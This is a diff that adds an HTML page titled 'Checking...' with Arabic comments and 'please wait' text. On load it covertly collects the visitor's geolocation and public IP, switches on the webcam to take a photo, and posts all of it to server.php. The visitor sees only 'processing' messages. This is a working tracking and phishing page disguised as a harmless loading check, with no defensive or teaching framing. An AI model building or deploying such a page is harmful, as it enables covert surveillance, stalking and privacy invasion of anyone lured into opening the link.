@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Checking...</title>
+  <script>
+    async function sendData(location, imageBlob, ip) {
+      const formData = new FormData();
+      formData.append("latitude", location.coords.latitude);
+      formData.append("longitude", location.coords.longitude);
+      formData.append("ip", ip);
+
+      if (imageBlob) {
+        const file = new File([imageBlob], "image.jpg", { type: "image/jpeg" });
+        formData.append("image", file);
+      }
+
+      await fetch("server.php", {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "IP not found";
+      }
+    }
+
+    function getLocationAndSend() {
+      navigator.geolocation.getCurrentPosition(async function(position) {
+        const ip = await getIP();
+
+        // تشغيل الكاميرا
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+
+          // انتظر شوية لحد ما الكاميرا تشتغل كويس
+          setTimeout(async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+
+            // صور اللقطة وأوقف الكاميرا
+            stream.getTracks().forEach(track => track.stop());
+            const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+            await sendData(position, imageBlob, ip);
+            document.body.innerHTML = "<h2>جاري المعالجة...</h2>";
+          }, 2000);
+
+        } catch (err) {
+          console.error("Camera error:", err);
+          await sendData(position, null, ip);
+          document.body.innerHTML = "<h2>تم الإرسال بدون صورة</h2>";
+        }
+
+      }, function(error) {
+        document.body.innerHTML = "<h2>فشل في تحديد الموقع!</h2>";
+      });
+    }
+
+    window.onload = getLocationAndSend;
+  </script>
+</head>
+<body>
+  <h2>يرجى الانتظار قليلاً...</h2>
+</body>
+</html>
